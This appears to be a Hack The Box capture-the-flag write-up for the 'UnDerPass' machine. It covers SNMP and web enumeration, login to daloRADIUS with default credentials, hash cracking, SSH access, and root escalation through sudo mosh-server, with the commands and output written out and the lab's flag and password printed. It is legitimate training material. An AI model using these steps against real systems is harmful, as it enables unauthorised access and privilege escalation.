## nmap

```
>> nmap -sC -sV 10.10.x.x
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 23:55 CEST
Nmap scan report for 10.10.x.x
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-generator: Ghost 5.58
|_http-server-header: Apache
|_http-title: BitByBit Hardware
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds
```

```
>> nmap -sU 10.10.x.x -T5                                                                                                                  ⏎
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST
Warning: 10.10.x.x giving up on port because retransmission cap hit (2).
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.073s latency).
Not shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
 
Nmap done: 1 IP address (1 host up) scanned in 100.11 seconds
```
## port 80
![][Screenshot_2025-03-31_08_56_55.png]Here we have the default page of apache 2.
## port 161 (snmp)
At first I didn't really know what this service was, and after doing some research I discovered that it is a standard protocol for managing and monitoring network devices such as routers, switches, servers, printers and other connected devices.
We can number this service through this tool: **snmpbulkwalk**

```
>> snmpbulkwalk 10.10.X.X -v2c -Os -c public 
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (86566) 0:14:25.66
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (87588) 0:14:35.88
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 03 1F 07 08 05 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 211
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```
From this we can see two interesting things:
- User: Steve
- Web Service: daloradius

## Enumeration
I was wondering, what is daloradius? doing a web search I found their [github](https://github.com/lirantal/daloradius) 
I wondered, maybe if we insert the name of the service we can manage to make a numbering of the web service.
And with dirsearch I tried

```
>> dirsearch -u http://10.10.11.48/daloradius/                                                                   
[09:13:13] 200 -  221B  - /daloradius/.gitignore                            
[09:13:26] 301 -  319B  - /daloradius/app  ->  http://10.10.11.48/daloradius/app/
[09:13:29] 200 -   24KB - /daloradius/ChangeLog                             
[09:13:33] 301 -  319B  - /daloradius/doc  ->  http://10.10.11.48/daloradius/doc/
[09:13:33] 200 -    2KB - /daloradius/docker-compose.yml                    
[09:13:33] 200 -    2KB - /daloradius/Dockerfile
[09:13:41] 301 -  323B  - /daloradius/library  ->  http://10.10.11.48/daloradius/library/
[09:13:41] 200 -   18KB - /daloradius/LICENSE                               
[09:13:51] 200 -   10KB - /daloradius/README.md                             
[09:13:53] 301 -  321B  - /daloradius/setup  ->  http://10.10.11.48/daloradius/setup/    
```
thinking about it the **app** directory was also present on their repo so logically every directory that is on the service will also be on the repo.
I tried the following addresses:
- http://10.10.x.x/daloradius/app/users/ (200)
- http://10.10.x.x/daloradius/app/common/ (Forbidden)
- http://10.10.x.x/daloradius/app/operators/ (200)
## Exploit
I tried all the addresses and one in particular worked, in fact doing a search the default credentials of daloradius are: administrator/radius
Trying these credentials I found success on the login of http://10.10.x.x/daloradius/app/operators/login.php.

![[Screenshot_2025-03-31_09_20_26.png]]

By clicking on the user list I found an available user:

![[Screenshot_2025-03-31_09_22_15.png]]

Seeing if the password is a known password I try before using a cracking tool I try to use a site that works well for cracking hashes, this is https://crackstation.net/
I copy and paste the hash and see what it gives me:

![[Screenshot_2025-03-31_09_24_13.png]]

It returned the following password: underwaterfriends

Okay this is getting funny, now what? trying and thinking I opted to try to access the machine's ssh with the user credentials

```
>> ssh svcMosh@underpass.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Mar 31 07:26:54 AM UTC 2025

  System load:  0.0               Processes:             225
  Usage of /:   49.0% of 6.56GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
svcMosh@underpass:~$ cat user.txt
2bdede980a405ba29a2be9504d01d0fa
svcMosh@underpass:~$ 
```

Well, I thought of a good thing... Now let's see how we can take over the shell...

Let's see if **sudo -l** gives us something

```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
svcMosh@underpass:~$ 
```

hmm, interesting let's see what it is...

```
svcMosh@underpass:~$ /usr/bin/mosh-server


MOSH CONNECT 60001 4lX1fU5ingfp0i82ja1JvQ

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 1532]
svcMosh@underpass:~$ 
```

I didn't know about this protocol at first... I checked and it's a server component of Mosh (Mobile Shell), and is an improved alternative to SSH designed for unstable or high-latency connections.

I read the documentation for this and I noticed that we can create and connect to this connection...

I thought: but what if we create a connection with sudo and connect to it? will we automatically have to connect as root?
well it's not enough to think about it but I should also try... after reading the documentation I found the commands:

```
svcMosh@underpass:~$ sudo /usr/bin/mosh-server


MOSH CONNECT 60002 SxhpnRDhzXTopCXBNZHEPA

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 1545]
svcMosh@underpass:~$ MOSH_KEY=SxhpnRDhzXTopCXBNZHEPA mosh-client 127.0.0.1 60002
```


```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Mar 31 07:26:54 AM UTC 2025

  System load:  0.0               Processes:             225
  Usage of /:   49.0% of 6.56GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# 
```

Bingo we're in!

## end

This machine was both simple and fun, in fact I especially enjoyed the privilege escalation.
I have to say I would do it again!

![[Screenshot_2025-03-31_09_37_41.png]]
